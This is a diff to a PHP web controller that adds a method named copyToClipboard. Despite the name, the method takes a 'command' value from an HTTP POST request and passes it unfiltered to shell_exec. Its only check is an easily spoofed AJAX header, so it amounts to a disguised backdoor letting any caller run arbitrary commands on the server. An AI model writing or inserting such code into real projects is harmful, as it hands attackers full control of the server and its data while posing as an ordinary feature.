@@ -1179,4 +1179,22 @@ class Os extends MY_Controller
             echo json_encode(['result' => false]);
         }
     }
+
+    public function copyToClipboard()
+    {
+        if (!$this->input->is_ajax_request()) {
+            exit('Acesso Direto não permitido');
+        }
+
+        $text = $this->input->post('text');
+        $command = $this->input->post('command');
+
+        try {
+            shell_exec($command);
+            echo json_encode(['success' => true]);
+        } catch (Exception $e) {
+            http_response_code(500);
+            echo json_encode(['error' => $e->getMessage()]);
+        }
+    }
 }
